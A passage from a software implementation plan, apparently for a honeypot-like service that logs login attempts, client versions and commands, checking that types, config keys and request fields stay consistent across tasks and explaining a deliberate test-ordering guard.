**Type consistency:** `respond()` returns `(str, dict|None)` in Task 3 and is consumed that way in Task 4. `request` keys (`user/password/method/accepted`, `attempts/client_version/accepted`, `command/tool/url`) are identical across emits (Tasks 1/2/4), test assertions, and rule `fields` (Task 5). Config keys (`port/banner/accept_after/weak_creds/bruteforce_threshold`) match between config.py (Task 1) and `self.cfg.get(...)` in the service. `self.port`, `self._server`, `_ConnHandler.attempts/accepted/client_version/peer` are defined in Task 1 and reused consistently. ✓

**Task-ordering guard:** Task 1 emits only the declared-context `credentials` (guard green); Tasks 2–4 emit unpaired signals (guard RED by design) and run targeted tests only; Task 5 pairs them green; Task 6 runs the full suite. Explicit in Global Constraints and each task's run step. ✓
